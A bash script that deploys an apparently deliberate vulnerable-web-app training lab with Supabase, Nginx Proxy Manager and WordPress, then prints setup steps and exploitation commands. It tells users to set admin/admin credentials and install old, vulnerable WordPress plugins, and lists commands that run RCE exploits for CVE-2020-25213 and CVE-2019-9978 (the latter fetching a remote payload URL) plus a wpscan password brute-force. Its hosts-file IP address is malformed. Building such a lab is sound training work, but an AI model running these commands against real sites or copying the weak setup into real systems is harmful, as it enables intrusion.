#!/bin/bash

# Deployment script for Vulnerable Web App with Supabase and Nginx Proxy Manager

set -e

# Check for --restore flag
RESTORE_CONFIG=false
if [ "$1" == "--restore" ]; then
    RESTORE_CONFIG=true
fi

echo "🚀 Starting deployment of Vulnerable Web App..."

# Colors for output
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m' # No Color

# Function to print colored messages
print_message() {
    echo -e "${2}${1}${NC}"
}

# Step 1: Check if Docker is running
print_message "Checking Docker..." "$BLUE"
if ! docker info > /dev/null 2>&1; then
    print_message "❌ Docker is not running. Please start Docker first." "$RED"
    exit 1
fi
print_message "✅ Docker is running" "$GREEN"

# Step 2: Stop existing services
print_message "\n📦 Stopping existing services..." "$BLUE"
docker-compose down 2>/dev/null || true
supabase stop 2>/dev/null || true

# Step 3: Create Docker network
print_message "\n🌐 Creating Docker network..." "$BLUE"
docker network create vulnapp-network 2>/dev/null || print_message "Network already exists" "$YELLOW"

# Step 4: Start Supabase
print_message "\n🗄️  Starting Supabase services..." "$BLUE"
supabase start

# Step 5: Connect Supabase containers to our network
print_message "\n🔗 Connecting Supabase to network..." "$BLUE"
SUPABASE_CONTAINERS=$(docker ps --filter "name=supabase" --format "{{.Names}}")
for container in $SUPABASE_CONTAINERS; do
    docker network connect vulnapp-network $container 2>/dev/null || print_message "Container $container already connected" "$YELLOW"
done
print_message "✅ Supabase containers connected" "$GREEN"

# Step 6: Build and start webapp and Nginx Proxy Manager
print_message "\n🏗️  Building and starting web app..." "$BLUE"
docker-compose up -d --build

# Step 7: Wait for services to be ready
print_message "\n⏳ Waiting for services to be ready..." "$BLUE"
sleep 5

# Step 8: Restore configurations if requested
if [ "$RESTORE_CONFIG" = true ]; then
    print_message "\n🔄 Restoring saved configurations..." "$BLUE"
    SCRIPT_DIR="$(dirname "$0")"
    
    if [ -f "$SCRIPT_DIR/restore-config.sh" ]; then
        bash "$SCRIPT_DIR/restore-config.sh" || {
            print_message "⚠️  Restoration failed, but services are running" "$YELLOW"
        }
    else
        print_message "⚠️  restore-config.sh not found" "$YELLOW"
    fi
fi

# Step 9: Display service information
print_message "\n✅ Deployment complete!" "$GREEN"

if [ "$RESTORE_CONFIG" = true ]; then
    print_message "\n💾 Configurations have been restored from backup!" "$GREEN"
    print_message "NPM proxy hosts and WordPress plugins should be available" "$YELLOW"
fi

print_message "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" "$BLUE"
print_message "📊 ADMINISTRATION SERVICES (Localhost Access)" "$BLUE"
print_message "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" "$BLUE"
print_message "🔧 Nginx Proxy Manager:   http://localhost:81" "$GREEN"
print_message "   Default credentials:   admin@example.com / changeme" "$YELLOW"
print_message "   Purpose:               Configure domain proxies" "$YELLOW"
print_message "" "$NC"
print_message "📡 Supabase API:          http://localhost:54321" "$GREEN"
print_message "🎨 Supabase Studio:       http://localhost:54323" "$GREEN"
print_message "📧 Mailpit (Email Test):  http://localhost:54324" "$GREEN"
print_message "   Purpose:               Backend administration & monitoring" "$YELLOW"
print_message "" "$NC"
print_message "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" "$BLUE"
print_message "🌐 APPLICATION SERVICES (Domain Access via NPM)" "$BLUE"
print_message "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" "$BLUE"
print_message "✅ Project Management:    http://project.tujuh" "$GREEN"
print_message "⚠️  WordPress Lab:         http://wordpress.tujuh" "$RED"
print_message "" "$NC"
print_message "⚠️  NOTE: Direct port access (localhost:3000, localhost:8080) available" "$YELLOW"
print_message "         but NOT RECOMMENDED. Always use domain access." "$YELLOW"
print_message "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" "$BLUE"

print_message "\n📝 SETUP WORKFLOW (NPM-First Approach):" "$BLUE"
print_message "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" "$BLUE"
print_message "" "$NC"
print_message "STEP 1: Configure Nginx Proxy Manager" "$YELLOW"
print_message "  → Access NPM at http://localhost:81" "$NC"
print_message "  → Login: admin@example.com / changeme" "$NC"
print_message "  → Change default password immediately" "$NC"
print_message "  → Add Proxy Host for Project Management:" "$NC"
print_message "      Domain: project.tujuh" "$GREEN"
print_message "      Forward to: vulnapp-webapp:80" "$GREEN"
print_message "  → Add Proxy Host for WordPress:" "$NC"
print_message "      Domain: wordpress.tujuh" "$GREEN"
print_message "      Forward to: vulnerable-wordpress:80" "$GREEN"
print_message "" "$NC"
print_message "STEP 2: Configure Local DNS (/etc/hosts)" "$YELLOW"
print_message "  → Linux/macOS: sudo nano /etc/hosts" "$NC"
print_message "  → Windows: notepad C:\\Windows\\System32\\drivers\\etc\\hosts (as Admin)" "$NC"
print_message "  → Add these lines:" "$NC"
print_message "      1010.34.100.160 project.tujuh" "$GREEN"
print_message "      1010.34.100.160 wordpress.tujuh" "$GREEN"
print_message "" "$NC"
print_message "STEP 3: Install & Configure WordPress" "$YELLOW"
print_message "  → Navigate to http://wordpress.tujuh" "$NC"
print_message "  → Complete installation wizard" "$NC"
print_message "  → Use weak credentials: admin / admin" "$RED"
print_message "  → Install vulnerable plugins:" "$NC"
print_message "      - WP File Manager (v6.4 or earlier)" "$RED"
print_message "      - Social Warfare (v3.5.2 or earlier)" "$RED"
print_message "" "$NC"
print_message "STEP 4: Access Applications" "$YELLOW"
print_message "  → Project Management: http://project.tujuh" "$GREEN"
print_message "  → WordPress: http://wordpress.tujuh" "$GREEN"
print_message "" "$NC"
print_message "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" "$BLUE"

print_message "\n🎯 WORDPRESS EXPLOITATION TESTS:" "$RED"
print_message "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" "$RED"
print_message "1. CVE-2020-25213 (File Manager RCE):" "$YELLOW"
print_message "   python3 wordpress/exploits/cve-2020-25213-file-manager-rce.py http://wordpress.tujuh" "$NC"
print_message "" "$NC"
print_message "2. CVE-2019-9978 (Social Warfare RCE):" "$YELLOW"
print_message "   python3 wordpress/exploits/cve-2019-9978-remote.py http://wordpress.tujuh \\" "$NC"
print_message "     --payload-url https://gist.githubusercontent.com/.../payload.txt" "$NC"
print_message "" "$NC"
print_message "3. Weak Credentials (Brute Force):" "$YELLOW"
print_message "   wpscan --url http://wordpress.tujuh --usernames admin \\" "$NC"
print_message "     --passwords passwords.txt --password-attack wp-login" "$NC"
print_message "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" "$RED"

print_message "\n🔍 MONITORING & LOGS:" "$BLUE"
print_message "  docker-compose logs -f webapp" "$YELLOW"
print_message "  docker-compose logs -f wordpress" "$YELLOW"
print_message "  docker-compose logs -f nginx-proxy-manager" "$YELLOW"

print_message "\n🛑 STOP ALL SERVICES:" "$BLUE"
print_message "  ./scripts/stop.sh" "$YELLOW"

print_message "\n📖 COMPLETE DOCUMENTATION:" "$BLUE"
print_message "  See DOCUMENTATION.md for detailed setup and exploitation guides" "$YELLOW"

echo ""
